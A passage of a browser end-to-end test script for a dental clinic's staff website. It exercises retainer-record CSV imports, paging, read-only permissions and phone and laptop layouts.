  const ask = pr.locator('.modal', { hasText: 'Undo the copy for Lahore?' });
  await ask.waitFor();
  assert.match(await ask.innerText(), /14 copied retainers that nobody changed on the website will be taken off the Lahore tab of the Retainer Record\./);
  await ask.getByRole('button', { name: 'Undo the copy for Lahore' }).click();
  await pr.waitForSelector('.toast:has-text("The copy for Lahore is undone: 14 retainers taken off.")');
  // The file is checked again: now the copy can be made; the page says what it will do and the colours it gives.
  await sec.locator('.import-check').waitFor();
  assert.equal(await sec.locator('.import-check').innerText(), 'If you copy now: 3 retainers added to the Lahore tab.');
  assert.ok(await sec.locator('.rt-colours .pill.c-navy', { hasText: 'Maker Imported' }).count(), 'the most active new maker gets the strongest colour nobody has (navy), never light grey');
  await shot(pr, '46-retainer-import-copy');
  await sec.getByRole('button', { name: 'Copy 3 retainers into Lahore' }).click();
  const done = sec.locator('.alert-info', { hasText: 'Lahore: 3 retainers copied' });
  await done.waitFor();
  assert.match(await done.innerText(), /The website is the Retainer Record of Lahore from now on\.[\s\S]*Added to the retainer team: Maker Imported\./);
  assert.ok(await sec.getByRole('button', { name: 'Copy 3 retainers into Lahore' }).isDisabled(), 'copied: the button stays off');
  await sec.locator('.rt-copies li', { hasText: 'Lahore: copied on' }).filter({ hasText: '3 retainers' }).waitFor();
  // The same file again (a second drop, or an answer lost on the way): refused, nothing twice.
  await drop();
  await sec.locator('.alert-stop', { hasText: 'Lahore was already copied on' }).filter({ hasText: '(3 retainers)' }).waitFor();
  await pr.goto(BASE + '#/staff/retainers?city=2');
  await pr.locator('input[aria-label^="Patient name"]').first().waitFor();
  assert.match(await pr.locator('.page-head p').first().innerText(), /^Lahore: 3 retainers$/, 'the 14 rows nobody changed were taken back; the 3 of the corrected tab are in, once');
  const names = await pr.locator('input[aria-label^="Patient name"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(names.includes('Sample Import One') && names.includes('Sample Import Three'));
  assert.ok(await pr.locator('.rs-typed', { hasText: 'soon' }).count(), 'the unreadable date keeps its typed text');
  // No year on the tab: the dates end on or before today, so 23 December is the last one that has passed.
  const now = new Date();
  const decYear = now >= new Date(now.getFullYear(), 11, 23) ? now.getFullYear() : now.getFullYear() - 1;
  assert.equal(await pr.locator('input[aria-label="Impression date for Sample Import Two"]').inputValue(), `${decYear}-12-23`, '"23rd december" after a November row, in the year it last came');
  assert.ok(await pr.locator('.rl-chip.c-navy', { hasText: 'Maker Imported' }).count() === 0, 'Saima was in the banner already: the copy put nobody else there');
});
await step('Import: the Karachi tab as the sheet gives it (no headings for the Mr# and the name), copied after an undo that keeps the row changed on the website: Mr# linked only when the name fits, Model Poured, Payment Done / Dues, Status text in the notes', async () => {
  await pr.goto(BASE + '#/staff/admin?tab=import');
  const sec = pr.locator('section', { has: pr.locator('h2', { hasText: '7. Retainer Record' }) });
  await sec.waitFor();
  await sec.getByLabel('City of this tab').selectOption({ label: 'Karachi' });
  // (blank lines first: the row the undo keeps sits at row 5) Column A is headed with a first name, column B "Column 2".
  const csv = 'Sample,Column 2,Impression Date,Model Check By,Retainer Made By,Retainer Date ,Status,retainer sheet,Payments\n' + ',,,,,,,,\n'.repeat(60)
    + '09816,Usman Tariq,02-09-2026,dr. hina (sample),hassan (sample),09-09-2026,Delivered to Patient,,Payment Done\n'
    + '9815,Sample Other Name,03-09-2026,Dr. Hina (sample),Kamran (sample),,Model Poured,,Dues\n'
    + '7777,Sample Karachi Import,04-09-2026,,maker alpha,,"Upper wire changed, lower bonded on 14/9",,\n'
    + '123-4,Sample Karachi Four,05-09-2026,,,,Impression Repeat,Re-purchase needed,\n'
    + ',Sample Karachi Five,06-09-2026,,,,,,\n';
  await sec.locator('input[type=file]').setInputFiles({ name: 'Retainer Record - Karachi.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await sec.locator('.stat', { hasText: 'ready to copy' }).waitFor();
  assert.match(await sec.locator('.alert-info', { hasText: 'no headings' }).innerText(), /column A is read as the Mr# and column B as the patient name/);
  assert.equal(await sec.locator('.stat', { hasText: 'ready to copy' }).locator('strong').innerText(), '5');
  assert.equal(await sec.locator('.stat', { hasText: 'Mr# that link to their patient file' }).locator('strong').innerText(), '1 of 4', 'one Mr# links (its name fits), three do not');
  assert.match(await sec.locator('details summary', { hasText: 'unlinked' }).innerText(),
    /3 rows with an Mr# stay unlinked: 1 the name does not fit that patient file, 1 no patient file has this Mr#, 1 not an Mr#/);
  assert.match(await sec.locator('details summary', { hasText: 'like a note' }).innerText(), /1 Status cell reads like a note, not a status/);
  assert.match(await sec.locator('.alert-info', { hasText: 'not on the retainer team yet' }).innerText(), /will be added: Maker Alpha\./, '"hassan (sample)" and "dr. hina (sample)" are the team members already there');
  assert.equal(await sec.locator('.alert-warning', { hasText: 'not in the Status list' }).count(), 0, 'Model Poured and Impression Repeat are on the list');
  // Karachi is copied (the demo's tab). One of its rows was changed on the website (its Mr#, above): the undo keeps it.
  const stop = sec.locator('.alert-stop', { hasText: 'Karachi was already copied on' });
  await stop.waitFor();
  assert.match(await stop.innerText(), /\(46 retainers\)\. The website is now the Retainer Record: add or change retainers there\./);
  await stop.getByRole('button', { name: 'Undo the copy for Karachi' }).click();
  const ask = pr.locator('.modal', { hasText: 'Undo the copy for Karachi?' });
  await ask.waitFor();
  assert.match(await ask.innerText(), /45 copied retainers that nobody changed on the website will be taken off the Karachi tab/);
  assert.match(await ask.innerText(), /1 retainer was changed on the website \(edited, linked to a patient file, a payment set …\): it stays, and a new copy leaves out its row of the sheet\./);
  await ask.getByRole('button', { name: 'Undo the copy for Karachi' }).click();
  await pr.waitForSelector('.toast:has-text("The copy for Karachi is undone: 45 retainers taken off. 1 retainer stayed because it was changed on the website.")');
  await sec.locator('.import-check').waitFor();
  await shot(pr, '45-retainer-import-karachi');
  await sec.getByRole('button', { name: 'Copy 5 retainers into Karachi' }).click();
  const done = sec.locator('.alert-info', { hasText: 'Karachi: 5 retainers copied' });
  await done.waitFor();
  assert.match(await done.innerText(), /Mr#: 1 row linked to the patient file, 3 with an Mr# not linked/);
  await pr.goto(BASE + '#/staff/retainers?city=1');
  await pr.locator('table.rs-table tbody tr[data-id]').first().waitFor();
  const row = (name) => pr.locator('table.rs-table tbody tr[data-id]').filter({ has: pr.locator(`select[aria-label="Status for ${name}"]`) });
  assert.equal(await row('Usman Tariq').locator('.rs-mr').innerText(), '9816', '"09816" with the name of Mr# 9816: linked to that file');
  assert.equal(await row('Usman Tariq').locator('select[aria-label="Payments for Usman Tariq"]').inputValue(), 'Paid', 'Payment Done is Paid');
  assert.equal(await row('Sample Other Name').locator('input[aria-label="Mr# for Sample Other Name"]').inputValue(), '9815', 'another name: not linked, the Mr# kept');
  assert.equal(await row('Sample Other Name').locator('select[aria-label="Status for Sample Other Name"]').inputValue(), 'Model poured');
  assert.equal(await row('Sample Other Name').locator('select[aria-label="Payments for Sample Other Name"]').inputValue(), 'Pending', 'Dues is Pending');
  assert.equal(await row('Sample Karachi Import').locator('select[aria-label="Status for Sample Karachi Import"]').inputValue(), '', 'no status');
  assert.equal(await row('Sample Karachi Import').locator('input[aria-label="Notes for Sample Karachi Import"]').inputValue(), 'Upper wire changed, lower bonded on 14/9', 'the Status text is in the notes');
  assert.equal(await row('Sample Karachi Four').locator('input[aria-label="Mr# for Sample Karachi Four"]').inputValue(), '123-4');
  // The row the undo kept is there with its change, and says where it came from.
  const kept = await pr.locator('input[aria-label^="Mr# for"]').evaluateAll((els) => els.filter((e) => e.value === '0304').map((e) => e.getAttribute('aria-label').replace(/^Mr# for /, '')));
  assert.equal(kept.length, 1, 'the row changed on the website stayed');
  await pr.getByRole('button', { name: `More for ${kept[0]} (row`, exact: false }).click();
  await pr.locator('.modal', { hasText: 'it stayed as the website\'s own row when that copy was undone' }).waitFor();
  await pr.keyboard.press('Escape');
});
await step('Import: the city comes from the file\'s name, and another city stops the copy', async () => {
  await pr.goto(BASE + '#/staff/admin?tab=import');
  const sec = pr.locator('section', { has: pr.locator('h2', { hasText: '7. Retainer Record' }) });
  await sec.waitFor();
  await sec.getByLabel('City of this tab').selectOption({ label: 'Karachi' });
  const csv = 'Contact #,Patient Name,Impression Date,Model Check By,Retainer Made By,Retainer Date,Status\n'
    + ',Sample City One,,,Saima (sample),,Delivered to Patient\n,Sample City Two,,,,,Retainer Made\n,Sample City Three,,,,,\n';
  await sec.locator('input[type=file]').setInputFiles({ name: 'Retainer Record - Lahore.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await sec.locator('.alert-stop', { hasText: 'Lahore was already copied' }).waitFor();
  assert.equal(await sec.getByLabel('City of this tab').inputValue(), '2', 'Karachi was chosen, the file is the Lahore tab: Lahore is chosen');
  assert.match(await sec.locator('p.muted', { hasText: 'City: Lahore' }).innerText(), /because its name says Lahore/);
  // Karachi chosen by hand for the Lahore file: stop.
  await sec.getByLabel('City of this tab').selectOption({ label: 'Karachi' });
  await sec.locator('.alert-stop', { hasText: 'looks like the Lahore tab' }).waitFor();
  assert.ok(await sec.getByRole('button', { name: 'Copy 3 retainers into Karachi' }).isDisabled(), 'another city: no copy');
  await shot(pr, '47-retainer-import-city');
});
await step('Import: a Lahore-style tab (no years) whose last row is typed a day after today keeps its years, and that row is pointed out', async () => {
  await pr.goto(BASE + '#/staff/admin?tab=import');
  const sec = pr.locator('section', { has: pr.locator('h2', { hasText: '7. Retainer Record' }) });
  await sec.waitFor();
  // A row every two weeks up to three days ago (the clinic's day), then one typed for tomorrow; only the day and the month, as on the Lahore tab.
  const t = await pr.evaluate(async () => {
    const { localISO, addDaysISO } = await import('/js/ui/dom.js');
    const { monthName } = await import('/js/lib/records.js');
    const words = ['january', 'february', 'march', 'april', 'may', 'june', 'july', 'august', 'september', 'october', 'november', 'december'];
    const typed = (iso) => `${Number(iso.slice(8, 10))} ${words[Number(iso.slice(5, 7)) - 1]}`;
    const today = localISO();
    const dates = Array.from({ length: 24 }, (_, i) => addDaysISO(today, -(14 * (23 - i) + 3)));
    const csv = 'Contact #,Patient Name,Impression Date,Model Check By,Retainer Made By,Retainer Date,Status\n'
      + [...dates, addDaysISO(today, 1)].map((d, i) => `,Sample Slip ${i + 1},${typed(d)},Dr. Ali Rashid,Saima (sample),,Retainer Made\n`).join('');
    return { csv, months: `${monthName(dates[0])} to ${monthName(dates[23])}` };
  });
  await sec.locator('input[type=file]').setInputFiles({ name: 'Retainer Record - Lahore.csv', mimeType: 'text/csv', buffer: Buffer.from(t.csv) });
  await sec.locator('.stat', { hasText: 'months on the tab' }).waitFor();
  assert.equal(await sec.locator('.stat', { hasText: 'months on the tab' }).locator('strong').innerText(), t.months, 'not a year early');
  const late = sec.locator('.alert-warning', { hasText: 'after today' });
  assert.match(await late.innerText(), /^1 date is after today: row 26 \(/);
  await late.scrollIntoViewIfNeeded();
  await shot(pr, '49-retainer-import-slip');
});
await step('Retainer Record: "Show 100 more" adds the next rows under the ones on screen without drawing those again; the focus stays on the button, then goes to the first row added', async () => {
  // A big Islamabad tab (made-up rows), copied through the data layer after its small demo copy is undone.
  const total = await pr.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.undoRetainerCopy(3);
    const rows = Array.from({ length: 230 }, (_, i) => ({ row: i + 2, name: `Sample Bulk ${i + 1}`, impression_date: `2025-${String(1 + (i % 12)).padStart(2, '0')}-${String(1 + (i % 28)).padStart(2, '0')}` }));
    await state.data.importRetainerRecords(3, rows);
    return (await state.data.retainerRecords({ cityId: 3 })).length;
  });
  assert.ok(total >= 230, `Islamabad has ${total} rows`);
  await pr.goto(BASE + '#/staff/retainers?city=3');
  await pr.locator('.page-head p', { hasText: `Islamabad: ${total} retainers` }).waitFor();
  const trs = pr.locator('table.rs-table tbody tr[data-id]');
  assert.equal(await trs.count(), 100);
  await trs.first().evaluate((tr) => { tr.dataset.probe = 'kept'; });
  await pr.getByRole('button', { name: `Show 100 more (${total - 100} not shown yet)` }).click();
  const next = `Show ${Math.min(100, total - 200)} more (${total - 200} not shown yet)`;
  await pr.waitForFunction((n) => document.querySelectorAll('table.rs-table tbody tr[data-id]').length === n, 200);
  assert.equal(await trs.first().getAttribute('data-probe'), 'kept', 'the rows on screen stay as they are (not drawn again)');
  assert.equal((await trs.nth(100).locator('.rs-num').textContent()).replace(/\D/g, ''), '101', 'the rows added go on with the numbers');
  assert.equal(new Set(await trs.evaluateAll((els) => els.map((e) => e.dataset.id))).size, 200, 'no row twice');
  assert.equal(await pr.evaluate(() => document.activeElement?.textContent), next, 'the button keeps the focus and says what is left');
  await pr.keyboard.press('Enter');
  await pr.waitForFunction((n) => document.querySelectorAll('table.rs-table tbody tr[data-id]').length === n, total);
  assert.equal(await pr.locator('.rs-more-rows button').count(), 0, 'everything shown: no button');
  assert.equal(await pr.evaluate(() => [...document.querySelectorAll('table.rs-table tbody tr[data-id]')].indexOf(document.activeElement?.closest('tr'))), 200,
    'the first row added has the focus');
  // A search draws the list again from its top.
  await pr.getByLabel('Search by name, Mr# or phone').fill('Sample Bulk 2');
  await pr.locator('.page-head p', { hasText: 'match these filters' }).waitFor();
  assert.equal(await trs.first().getAttribute('data-probe'), null);
  await pr.getByRole('button', { name: 'Clear filters' }).click();
});
await step('Read only: the front desk (no "Manage retainer cases", no "Lab work entries") sees both pages without anything to change', async () => {
  await tryAnotherRole(pr);
  await loginAs(pr, 'Front desk \\(North Nazimabad\\)');
  await pr.goto(BASE + '#/staff/retainers');
  await pr.waitForSelector('table.rs-table tbody tr[data-id]');
  assert.equal(await pr.locator('.rs-tabs').count(), 0, 'one city (Karachi) for a desk limited to North Nazimabad: no tabs');
  assert.match(await pr.locator('.page-head p').first().innerText(), /^Karachi: \d+ retainers$/);
  assert.equal(await pr.getByRole('button', { name: '+ New retainer' }).count(), 0, 'no add button');
  assert.equal(await pr.locator('table.rs-table select, table.rs-table input').count(), 0, 'no drop-downs or typing cells');
  assert.ok(await pr.locator('table.rs-table tbody td .rs-ro', { hasText: /^030[34]$/ }).count(), 'a typed Mr# is plain text');
  assert.ok(await pr.locator('table.rs-table .pill.c-purple').count(), 'the coloured chips are still there, as plain chips');
  await pr.getByRole('button', { name: /^More for / }).first().click();
  assert.equal(await pr.locator('.modal').getByRole('button', { name: 'Remove this row' }).count(), 0, 'and nothing to remove');
  await pr.keyboard.press('Escape');
  await pr.goto(BASE + '#/staff/lab');
  await pr.waitForSelector('table.rs-table tbody tr[data-id]');
  assert.match(await pr.locator('.page-head p').first().innerText(), /^North Nazimabad: \d+ lab cases$/);
  assert.equal(await pr.getByRole('button', { name: '+ New lab case' }).count(), 0);
  assert.equal(await pr.locator('table.rs-table select, table.rs-table input').count(), 0);
  // The data layer says no too.
  const answer = await pr.evaluate(async () => { const { state } = await import('/js/state.js'); try { await state.data.addRetainerRecord({ city_id: 1, patient_name: 'Sample Desk Try' }); return 'added'; } catch (e) { return e.message; } });
  assert.match(answer, /row-level security/);
  await pr.goto(BASE + '#/staff/coordinator?tab=lab');
  await pr.waitForURL(/#\/staff\/lab/);
});
// A 1366x768 laptop: Chrome's own bars leave a 1366x657 window.
const prl = await newPage({ width: 1366, height: 657 });
await step('laptop (1366x657 window): the wheel over the Retainer Record brings the sheet up to fill the window, then scrolls its rows; at least 10 rows in sight', async () => {
  await loginAs(prl, 'Dr. Ali Rashid');
  await prl.goto(BASE + '#/staff/retainers');
  await prl.waitForSelector('table.rs-table tbody tr[data-id]');
  const where = () => prl.evaluate(() => {
    const w = document.querySelector('.rs-wrap');
    const b = w.getBoundingClientRect();
    const top = Math.max(b.top, document.querySelector('.rs-table thead').getBoundingClientRect().bottom);
    const foot = document.querySelector('.rs-table tfoot')?.getBoundingClientRect().top ?? b.bottom;
    const bottom = Math.min(b.bottom, foot, innerHeight);
    const rows = [...w.querySelectorAll('tbody tr[data-id]')].filter((tr) => { const r = tr.getBoundingClientRect(); return r.top >= top - 1 && r.bottom <= bottom + 1; }).length;
    return { page: Math.round(scrollY), inside: Math.round(w.scrollTop), tabs: Math.round(document.querySelector('.rs-tabs').getBoundingClientRect().top), bar: Math.round(document.querySelector('.topbar').getBoundingClientRect().bottom), frameTop: Math.round(b.top), rows };
  });
  const start = await where();
  assert.equal(start.page, 0);
  // The wheel turned down over the part of the sheet in sight: the page moves first, the rows stay where they are.
  await prl.mouse.move(683, Math.round((start.frameTop + 657) / 2));
  let up = start;
  for (let i = 0; i < 12 && Math.abs(up.tabs - up.bar) > 1; i++) {
    assert.equal(up.inside, 0, 'the rows stay where they are while the page moves');
    await prl.mouse.wheel(0, 120);
    await prl.waitForTimeout(80);
    up = await where();
  }
  assert.ok(up.page > 0, 'the page scrolled');
  assert.ok(Math.abs(up.tabs - up.bar) <= 1, `the tabs sit under the top bar (${up.tabs}px, ${up.bar}px)`);
  assert.ok(up.rows >= 10, `${up.rows} rows in sight (2 to 5 before)`);
  await shot(prl, '48-retainer-record-laptop-657');
  // Then the rows scroll, and the page stays. (The wheel over the middle of the sheet, which now fills the window: the spot it was turned at
  // before can be under the sheet now, when a line above it, the overdue retainer checks, made the sheet start lower on the first screen.)
  const inside = up.inside;
  await prl.mouse.move(683, await prl.evaluate(() => { const b = document.querySelector('.rs-wrap').getBoundingClientRect(); return Math.round((b.top + Math.min(b.bottom, innerHeight)) / 2); }));
  for (let i = 0; i < 3; i++) { await prl.mouse.wheel(0, 120); await prl.waitForTimeout(60); }
  await prl.waitForFunction((was) => document.querySelector('.rs-wrap').scrollTop > was, inside);
  assert.equal((await where()).page, up.page, 'the page did not move');
  await prl.close();
});
const prm = await newPage({ width: 390, height: 844 });
await step('phone: the Retainer Record and Lab work fit the screen; the table scrolls inside its frame, the patient column stays at the left', async () => {
  await loginAs(prm, 'Clinic coordinator');
  for (const path of ['#/staff/retainers', '#/staff/lab']) {
    await prm.goto(BASE + path);
    await prm.waitForSelector('table.rs-table tbody tr[data-id]');
    const fit = await prm.evaluate(() => ({ page: document.documentElement.scrollWidth - document.documentElement.clientWidth, wrap: (() => { const w = document.querySelector('.rs-wrap'); return w.scrollWidth > w.clientWidth; })() }));
    assert.equal(fit.page, 0, `${path}: no sideways scroll of the page`);
    assert.ok(fit.wrap, `${path}: the table scrolls inside its frame`);
    await prm.locator('.rs-wrap').evaluate((w) => { w.scrollLeft = 400; });
    const left = await prm.locator('table.rs-table tbody th.rs-who').first().evaluate((el) => Math.round(el.getBoundingClientRect().left - el.closest('.rs-wrap').getBoundingClientRect().left));
    assert.ok(Math.abs(left) <= 1, `${path}: the patient column stays at the left edge (${left}px)`);
  }
  await shot(prm, '44-lab-work-phone');
});
await step('phone: the Retainer Record shows everybody in the banner, two side by side, and still has rows on the first screen ("More filters" is closed, Status stays in sight)', async () => {
  await prm.goto(BASE + '#/staff/retainers');
  await prm.waitForSelector('table.rs-table tbody tr[data-id]');
  const more = prm.locator('.rs-toolbar .rs-more-btn');
  assert.equal(await more.getAttribute('aria-expanded'), 'false');
  assert.ok(await prm.locator('.rs-toolbar select[aria-label="Status"]').isVisible(), 'Status is in sight');
  // The overdue retainer checks: one line under the title, without the names on a phone (so the rows stay on the first screen).
  assert.equal(await prm.locator('.rs-notice').innerText(), '2 retainer checks are overdue. Show only them');
  assert.ok(await prm.locator('.rs-notice').evaluate((p) => p.getBoundingClientRect().height < 32), 'one line');
  assert.equal(await prm.locator('.rs-toolbar select[aria-label="Retainer made by"]').isVisible(), false, 'the other filters are behind "More filters"');
  // Every chip whole on the screen (no strip to swipe, no name or number cut off at the edge), two on a line; the demo's four people
  // take two lines.
  const team = await prm.locator('.rl-team').evaluate((ul) => {
    const vw = document.documentElement.clientWidth;
    const chips = [...ul.querySelectorAll('.rl-chip')].map((c) => c.getBoundingClientRect());
    const cut = [...ul.querySelectorAll('.rl-chip .rl-who')].filter((w) => w.scrollWidth > w.clientWidth + 1).length;
    return { n: chips.length, inView: chips.every((b) => b.left >= 0 && b.right <= vw), lines: new Set(chips.map((b) => Math.round(b.top))).size, sideways: ul.scrollWidth > ul.clientWidth + 1, cut };
  });
  assert.deepEqual(team, { n: 4, inView: true, lines: 2, sideways: false, cut: 0 }, 'everybody in the banner is in sight');
  const parts = await prm.locator('.rl-chip', { hasText: 'Hassan (sample)' }).locator('.rl-part').evaluateAll((els) => els.map((e) => ({ text: e.textContent, top: e.getBoundingClientRect().top, bottom: e.getBoundingClientRect().bottom })));
  assert.ok(parts.length === 2 && /^This month \d+ made, \d+ delivered$/.test(parts[0].text) && /^All time [1-9]\d* made$/.test(parts[1].text) && parts[1].top >= parts[0].bottom - 1,
    'this month and all time on a line each: ' + JSON.stringify(parts));
  // The first row starts on the first screen, without the notice of the demo above the page (the live site has none).
  const top = await prm.locator('table.rs-table tbody tr[data-id]').first().evaluate((el) => el.getBoundingClientRect().top);
  const demoNote = await prm.locator('.demo-banner').evaluate((el) => el.getBoundingClientRect().height + parseFloat(getComputedStyle(el).marginBottom));
  assert.ok(top - demoNote < 760, `the first row starts at ${Math.round(top - demoNote)}px of an 844px screen (${Math.round(top)}px under the demo's notice)`);
  await shot(prm, '47-retainer-record-phone');
  await more.click();
  assert.equal(await more.getAttribute('aria-expanded'), 'true');
  await prm.locator('.rs-toolbar select[aria-label="Retainer made by"]').selectOption({ index: 1 });
  await prm.waitForFunction(() => /\(1 in use\)/.test(document.querySelector('.rs-more-btn')?.textContent || ''));
  assert.ok(await prm.getByRole('button', { name: 'Clear filters' }).isVisible(), 'something is filtered: "Clear filters" shows');
  await prm.getByRole('button', { name: 'Clear filters' }).click();
});

// ------------------------------------------------------------- phone width
const pp = await newPage({ width: 375, height: 812 });
const noSideScroll = async (pg) => assert.ok(await pg.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'the page itself does not scroll sideways');
await step('phone: the Checkups page and the Aaj ki List with checkup rows fit the screen', async () => {
  await loginAs(pp, 'Front desk \\(North Nazimabad\\)');
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  await noSideScroll(pp);
  assert.ok(await pp.getByLabel('Name or phone').isVisible());
  assert.ok(await pp.getByRole('button', { name: 'Next' }).isVisible() || (await pp.locator('.pager-info').isVisible()));
  await shot(pp, '17-checkups-phone');
  await pp.goto(BASE + '#/staff/sheet');
  await pp.waitForSelector('table.sheet tbody tr.is-checkup');
  await noSideScroll(pp);
  await shot(pp, '18-sheet-checkups-phone');
});

await step('phone: the Patient column of the Checkups page stays at the left edge while the other columns scroll sideways', async () => {
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  const pinned = await pp.evaluate(() => {
    const wrap = document.querySelector('.checkup-table-wrap');
    wrap.scrollLeft = wrap.scrollWidth;
    const w = wrap.getBoundingClientRect();
    const cell = document.querySelector('table.checkup-table tbody tr[data-id] th.checkup-who').getBoundingClientRect();
    const head = document.querySelector('table.checkup-table thead th.checkup-who').getBoundingClientRect();
    return { scrolled: wrap.scrollLeft, cellLeft: cell.left - w.left, headLeft: head.left - w.left, cellRight: cell.right - w.left, wide: w.width };
  });
  assert.ok(pinned.scrolled > 200, 'the table scrolled sideways: ' + JSON.stringify(pinned));
  assert.ok(Math.abs(pinned.cellLeft) <= 2 && Math.abs(pinned.headLeft) <= 2, 'the name cell and its heading stay at the left edge: ' + JSON.stringify(pinned));
  assert.ok(pinned.cellRight < pinned.wide, 'and leave room for the other columns: ' + JSON.stringify(pinned));
  await noSideScroll(pp);
  // Register and Edit sit side by side, so a row is not taller than it needs to be
  const sides = await pp.evaluate(() => {
    const tr = document.querySelector('table.checkup-table tbody tr[data-id]');
    const buttons = [...tr.querySelectorAll('.row-actions button')].map((b) => b.getBoundingClientRect());
    return { n: buttons.length, sameLine: buttons.every((b) => Math.abs(b.top - buttons[0].top) < 2) };
  });
  assert.ok(sides.n >= 1 && sides.sameLine, 'the row buttons are on one line');
});

await step('phone: the Checkups page has a row on the first screen (More filters is closed), and the Aaj ki List add panel says it in one short sentence pair', async () => {
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pp.locator('details.checkup-more').evaluate((el) => el.open), false);
  const top = await pp.locator('table.checkup-table tbody tr[data-id]').first().evaluate((el) => el.getBoundingClientRect().top);
  assert.ok(top < 700, 'the first row starts at ' + Math.round(top) + 'px of an 812px screen');
  await pp.goto(BASE + '#/staff/sheet');
  await pp.waitForSelector('.add-panel:not([hidden])');
  const hint = (await pp.locator('.add-panel-text .muted').innerText()).trim();
  assert.equal(hint, 'New and starting treatment? Use "+ New walk-in" (gets an Mr#). Only a checkup? Use "+ Add checkup patient" (no Mr#).');
});
await step('phone: the Today page\'s "+ Add checkup patient" (name and mobile only), the whole checkup form of the Checkups page and a checkup row\'s "Fill in form" fit a 390 px screen', async () => {
  await pp.setViewportSize({ width: 390, height: 844 });
  await pp.goto(BASE + '#/staff/today');
  await pp.locator('section.today-checkup').getByRole('button', { name: '+ Add checkup patient' }).click();
  const quick = pp.locator('.modal');
  await quick.waitFor();
  await noSideScroll(pp);
  assert.ok(await quick.evaluate((el) => el.scrollWidth <= el.clientWidth + 1), 'the dialog does not scroll sideways');
  assert.deepEqual(await quickFields(quick), ['Patient full name', 'Mobile number']);
  await shot(pp, '21-checkup-quick-phone');
  await quick.getByRole('button', { name: 'Cancel' }).click();
  await pp.waitForSelector('.modal', { state: 'detached' });
  // the whole form, on the Checkups page
  await pp.goto(BASE + '#/staff/checkups');
  await pp.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = pp.locator('.modal');
  await m.waitFor();
  await noSideScroll(pp);
  assert.ok(await m.evaluate((el) => el.scrollWidth <= el.clientWidth + 1), 'the form does not scroll sideways');
  const widths = await m.locator('.checkup-form > *').evaluateAll((els) => els.filter((e) => e.offsetParent).map((e) => Math.round(e.getBoundingClientRect().width)));
  assert.ok(widths.every((w) => w === widths[0]), 'one question per line on a phone: ' + widths.join(','));
  await shot(pp, '21-checkup-form-phone');
  // a tap on the strip around the dialog does not throw the typed answers away without asking
  await m.getByLabel(/^Patient full name/).fill('Phone Typed Person');
  assert.ok(await pp.evaluate(() => document.elementFromPoint(2, 2)?.classList.contains('modal-backdrop')), 'the backdrop is at the top left corner');
  await pp.mouse.click(2, 2);
  const ask = pp.locator('.modal', { hasText: 'Discard this checkup form?' });
  await ask.waitFor();
  await ask.getByRole('button', { name: 'Keep filling in' }).click();
  await ask.waitFor({ state: 'detached' });
  assert.equal(await m.getByLabel(/^Patient full name/).inputValue(), 'Phone Typed Person');
  await pp.mouse.click(2, 2);
  await ask.getByRole('button', { name: 'Discard' }).click();
  await pp.waitForSelector('.modal', { state: 'detached' });
  // a checkup row's "Fill in form": right after the name, in sight without scrolling sideways, its words whole
  await pp.goto(BASE + '#/staff/sheet');
  const btn = pp.locator('table.sheet tbody tr.is-checkup button.form-later').first();
  await btn.waitFor();
  const box = await btn.boundingBox();
  assert.ok(box.x >= 0 && box.x + box.width <= 390, `in sight: ${Math.round(box.x)}-${Math.round(box.x + box.width)} px`);
  assert.ok(await btn.evaluate((el) => el.scrollWidth <= el.clientWidth), 'its words fit whole');
  await shot(pp, '22-fill-in-form-phone');
  await pp.setViewportSize({ width: 375, height: 812 });
});
// ------------------------------------------------------------- Register needs both "Register new patients" and list editing
await step('Register needs both "Register new patients" and list editing: with list editing off for a person the button is not offered, and the data layer says no', async () => {
  // (the accountant's page: its own in-memory demo data, not used again after this)
  await tryAnotherRole(pa);
  await loginAs(pa, 'Dr. Ali Rashid');
  await pa.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-fd-nn', 'sheet.edit', false); });
  await tryAnotherRole(pa);
  await loginAs(pa, 'Front desk.*North Nazimabad');
  const rights = await pa.evaluate(async () => { const { can } = await import('/js/state.js'); return [can('patients.create'), can('sheet.edit'), can('sheet.view')]; });
  assert.deepEqual(rights, [true, false, true], 'may register patients and see the list, but not edit it');
  await pa.goto(BASE + '#/staff/checkups');
  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pa.locator('table.checkup-table').getByRole('button', { name: /^Register / }).count(), 0, 'no Register button on the Checkups page');
  await pa.goto(BASE + '#/staff/sheet');
  await pa.waitForSelector('table.sheet tbody tr.is-checkup');
  await pa.locator('table.sheet tbody tr.is-checkup').first().getByRole('button', { name: /Checkup options/ }).click();
  await pa.locator('.modal').waitFor();
  assert.equal(await pa.locator('.modal').getByRole('button', { name: 'Register as patient' }).count(), 0, 'and none in the options of a checkup row');
  await pa.keyboard.press('Escape');
  const answer = await pa.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const rows = await state.data.listDayCheckups({ branchId: 2, date: localISO() });
    try { await state.data.registerCheckupAsPatient(rows[0].id); return 'registered'; } catch (e) { return e.message; }
  });
  assert.match(answer, /NOT_ALLOWED: registering a patient needs "Register new patients" and "Add and edit Aaj ki List entries"/);
});

// ------------------------------------------------------------- the homepage forms: "Join our team" and "Complaints & suggestions"
// (owner, 11 Oct 2026). A visitor on a phone sends both forms; then Dr. Ali finds the application on the Job applications page and the
// website forms in the Complaints inbox; the clinic coordinator (no jobs.view) sees no application at all.
const pf = await newPage({ width: 390, height: 844 });
const docWidth = (pg) => pg.evaluate(() => document.documentElement.scrollWidth);
// Where the parts of the top bar sit, as [left, top, right, bottom]: the name, the nav and each link. Plus the doors and the
// sample-account line under them (page y), for the hero without the old buttons.
const barLayout = (pg) => pg.evaluate(() => {
  const r = (el) => { const b = el.getBoundingClientRect(); return [Math.round(b.left), Math.round(b.top + scrollY), Math.round(b.right), Math.round(b.bottom + scrollY)]; };
  const bar = document.querySelector('.site-header');
  return {
